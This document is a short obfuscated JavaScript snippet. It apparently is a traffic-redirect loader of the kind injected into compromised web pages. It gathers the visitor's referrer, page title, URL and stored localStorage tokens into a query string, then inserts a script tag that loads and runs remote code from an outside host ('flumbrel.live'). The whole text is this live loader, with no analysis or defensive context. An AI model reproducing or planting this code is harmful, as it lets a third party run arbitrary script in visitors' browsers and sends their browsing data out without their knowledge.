var name = '_DfsgBMXzG7LHRdr6';
    if (!window._DfsgBMXzG7LHRdr6) {
        window._DfsgBMXzG7LHRdr6 = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://flumbrel.live/mwN7VWDH',
        };
    }
    const _zJGzXwmxW2BYRgNZ = localStorage.getItem('config');
    if (typeof _zJGzXwmxW2BYRgNZ !== 'undefined' && _zJGzXwmxW2BYRgNZ !== null) {
        var _QYmyXjTCZLjy7NPG = JSON.parse(_zJGzXwmxW2BYRgNZ);
        var _jgYYvctK695MS3Hn = Math.round(+new Date()/1000);
        if (_QYmyXjTCZLjy7NPG.created_at + window._DfsgBMXzG7LHRdr6.ttl < _jgYYvctK695MS3Hn) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _HKL2CkVrZG94WxqN = localStorage.getItem('subId');
    var _2NMP2Q3Pb8NzBMbC = localStorage.getItem('token');
    var _zbYngywH8WK1wj95 = '?return=js.client';
        _zbYngywH8WK1wj95 += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _zbYngywH8WK1wj95 += '&se_referrer=' + encodeURIComponent(document.referrer);
        _zbYngywH8WK1wj95 += '&default_keyword=' + encodeURIComponent(document.title);
        _zbYngywH8WK1wj95 += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _zbYngywH8WK1wj95 += '&name=' + encodeURIComponent(name);
        _zbYngywH8WK1wj95 += '&host=' + encodeURIComponent(window._DfsgBMXzG7LHRdr6.R_PATH);
    if (typeof _HKL2CkVrZG94WxqN !== 'undefined' && _HKL2CkVrZG94WxqN && window._DfsgBMXzG7LHRdr6.unique) {
        _zbYngywH8WK1wj95 += '&sub_id=' + encodeURIComponent(_HKL2CkVrZG94WxqN);
    }
    if (typeof _2NMP2Q3Pb8NzBMbC !== 'undefined' && _2NMP2Q3Pb8NzBMbC && window._DfsgBMXzG7LHRdr6.unique) {
        _zbYngywH8WK1wj95 += '&token=' + encodeURIComponent(_2NMP2Q3Pb8NzBMbC);
    }
    if ('' !== '') {
        _zbYngywH8WK1wj95 += '&bypass_cache=';
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._DfsgBMXzG7LHRdr6.R_PATH + _zbYngywH8WK1wj95;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
